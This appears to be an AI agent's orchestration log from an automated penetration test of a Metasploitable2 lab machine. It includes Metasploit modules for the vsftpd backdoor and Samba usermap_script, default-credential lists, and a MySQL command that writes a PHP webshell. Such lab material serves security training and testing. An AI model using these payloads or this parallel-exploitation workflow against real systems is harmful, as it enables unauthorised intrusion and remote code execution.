messages.content: Mission target: 192.168.56.101. Begin the engagement now. Spawn the appropriate first agent.

{"thought": "SITUATION: New engagement against 192.168.56.101. No prior intelligence. Phase is OSINT/pre-scan. I have no service information yet — I cannot make exploit decisions without knowing what ports and services are running. The first and only correct action is to spawn a scanner agent to perform comprehensive enumeration of the target. I need TCP port scan, service version detection, OS fingerprinting, and script-based enumeration (NSE). UDP scan for SNMP/TFTP/NFS would also be valuable but can follow. DECISION: Spawn a scanner agent immediately targeting 192.168.56.101. This is the mandatory first step — no exploit agents until I have scan results.", "situation": "No intelligence on 192.168.56.101 yet. Zero open ports known. Zero services identified. Cannot form any exploit hypothesis without enumeration data.", "hypothesis": "Target could be any profile — legacy Linux, Windows, network device. Full port scan will reveal the attack surface and allow me to cross-reference service versions against my CVE knowledge base.", "decision": "Spawn scanner agent with comprehensive TCP enumeration, service version detection, OS detection, and NSE scripts. This is the correct and only first action.", "action": "spawn_agent", "parameters": {"agent_type": "scanner", "target": "192.168.56.101", "task_type": "full_scan", "options": {"ports": "1-65535", "service_version": true, "os_detection": true, "scripts": "default", "udp_ports": "161,69,2049,123"}}}

{"thought": "SITUATION: Scanner agent scanner-63df80a8 has been spawned and is running against 192.168.56.101. I need to wait for it to complete before I can make any exploit decisions. No service information is available yet. DECISION: Call wait_for_agents with 'all' to wait for the scanner to finish. Timeout for scanner is 1200s.", "action": "wait_for_agents", "parameters": {"agent_ids": "all", "timeout": 1200}}

{"thought": "SITUATION: Scan complete. Target 192.168.56.101 is Metasploitable2 running Linux 2.6.27-2.6.28. Full port inventory:
- 21/tcp: vsftpd 2.3.4 → CVE-2011-2523 CRITICAL backdoor (smiley-face username opens root shell on port 6200)
- 22/tcp: OpenSSH 4.7p1 Debian
- 23/tcp: Linux telnetd → try blank/default creds
- 25/tcp: Postfix smtpd
- 53/tcp: ISC BIND 9.4.2
- 80/tcp: Apache httpd 2.2.8 → needs web scan
- 111/tcp: rpcbind v2 → check NFS mounts
- 139/445/tcp: Samba 3.X → CVE-2007-2447 CRITICAL (usermap_script, unauthenticated root)
- 3306/tcp: MySQL 5.0.51a → likely blank root password
- 5900/tcp: VNC → try blank password

Note: r-services (512/513/514) were NOT found in this scan, so I won't attempt rsh_exec. Also no distccd on 3632.

HYPOTHESIS: This is classic Metasploitable2. Multiple CRITICAL vectors available:
1. vsftpd 2.3.4 / CVE-2011-2523: Backdoor, username ':)' triggers root shell listener on port 6200. MSF module: exploit/unix/ftp/vsftpd_234_backdoor. HIGHEST confidence.
2. Samba 3.X / CVE-2007-2447: usermap_script RCE, unauthenticated root. MSF module: exploit/multi/samba/usermap_script. HIGHEST confidence.
3. MySQL 5.0.51a: blank root password likely → can write webshell via SELECT INTO OUTFILE
4. VNC port 5900: blank password common on Metasploitable
5. Telnet port 23: default creds
6. HTTP port 80: Apache 2.2.8 → web scan for additional vectors

DECISION: Spawn ALL viable exploit vectors simultaneously in batch. Per my methodology, I exploit in parallel — not serially. I will spawn:
- exploit agent for vsftpd/21 (CVE-2011-2523, CRITICAL)
- exploit agent for samba/445 (CVE-2007-2447, CRITICAL) 
- exploit agent for mysql/3306 (blank root, HIGH)
- exploit agent for vnc/5900 (blank password, HIGH)
- exploit agent for telnet/23 (default creds, MEDIUM)
- webapp agent for http/80 (web scan, runs slow in background)

Port numbers in task_type and options.port are taken DIRECTLY from scan findings. I do NOT use any placeholder IPs.", "situation": "192.168.56.101: Metasploitable2, Linux 2.6.27-2.6.28. 11 open ports identified. Two CRITICAL unauth root vectors (vsftpd backdoor, Samba usermap_script), plus MySQL blank creds, VNC, Telnet, and Apache HTTP.", "hypothesis": "vsftpd 2.3.4 backdoor (CVE-2011-2523) and Samba usermap_script (CVE-2007-2447) are both CRITICAL confidence unauth root shells. One of these will succeed in under 60 seconds. MySQL blank root and VNC blank password are high-confidence fallbacks.", "decision": "spawn_agents_batch with all viable vectors in parallel. vsftpd+Samba are highest priority. MySQL, VNC, Telnet, and web scan run simultaneously. First shell + flag = mission done.", "action": "spawn_agents_batch", "parameters": {"agents": [{"agent_type": "exploit", "target": "192.168.56.101", "task_type": "exploit_vsftpd_21", "options": {"port": 21, "module": "exploit/unix/ftp/vsftpd_234_backdoor", "cve": "CVE-2011-2523"}}, {"agent_type": "exploit", "target": "192.168.56.101", "task_type": "exploit_samba_445", "options": {"port": 445, "module": "exploit/multi/samba/usermap_script", "cve": "CVE-2007-2447"}}, {"agent_type": "exploit", "target": "192.168.56.101", "task_type": "exploit_mysql_3306", "options": {"port": 3306, "technique": "blank_root_credentials", "post_commands": ["show databases;", "SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/sh.php';"]}}, {"agent_type": "exploit", "target": "192.168.56.101", "task_type": "exploit_vnc_5900", "options": {"port": 5900, "technique": "blank_password"}}, {"agent_type": "exploit", "target": "192.168.56.101", "task_type": "exploit_telnet_23", "options": {"port": 23, "credentials": [{"user": "root", "pass": ""}, {"user": "root", "pass": "root"}, {"user": "admin", "pass": "admin"}, {"user": "msfadmin", "pass": "msfadmin"}]}}, {"agent_type": "webapp", "target": "192.168.56.101", "task_type": "web_scan_80", "options": {"port": 80, "checks": ["nikto", "dirb", "webdav", "php_cgi"]}}]}}
